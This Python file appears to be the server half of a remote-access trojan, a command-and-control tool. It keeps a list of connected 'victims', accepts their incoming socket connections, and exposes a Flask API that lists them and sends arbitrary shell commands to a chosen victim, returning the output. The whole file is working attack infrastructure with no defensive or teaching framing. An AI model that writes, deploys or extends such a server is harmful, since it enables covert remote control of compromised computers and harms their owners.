from time import sleep
from flask import jsonify, request
from utils.connection_types import Client
import socket   
from sys import argv
from utils import logger
from utils.utils import *
from threading import Thread
from utils.api_types import export_app

victims = list()

app = export_app()


@app.route('/victims')
def get_victims(): 
    global victims

    victims = check_users_connection(victims)

    users = list()

    for victim in victims:
        users.append({
            'clientId' : victim.client_id
        })

    return jsonify({
        'TOTAL SIZE': len(victims),
        'USERS' : users         
    })


@app.route('/command', methods=['POST'])
def send_command():
    data = request.json

    client_id = data.get('clientId')
    command = data.get('command')   

    if not client_id or not command:
        return 'INVALID DATA'

    for client in victims:
        if client.client_id == client_id:
            client.conn.send(command.encode('utf-8'))
            client.__proccessing__ = True

            while client.__proccessing__:
                sleep(.15)

            return client.__last__

    return 'CALCULATE ERROR'

api = Thread(target=app.run, name="API Handler 1", daemon=True,
             kwargs={'host': '0.0.0.0', 'port': 9001})

api.start()

if argv[1] == '--dev':
    HOST, PORT = 'localhost', 9090
if argv[1] == '--prod':
    HOST, PORT = '0.0.0.0', 9002

### SOCKET BINDING ###
sock = socket.socket()
sock.bind((HOST, PORT))

sock.listen(5)

logger.warning('DADDY STARTED ', HOST, ':', PORT)

while 'LISTENING':
    conn, addr = sock.accept()
    victims = check_users_connection(victims)

    client_id = 1

    if victims:
        client_id = victims[-1].client_id + 1

    logger.info('CONNECTED: ', addr)

    client = Client(conn, client_id)
    victims.append(client)

    handler = Thread(target=client.loop,
                     name=f"CLIENT {client_id} HANDLER")

    handler.start()

sock.close()
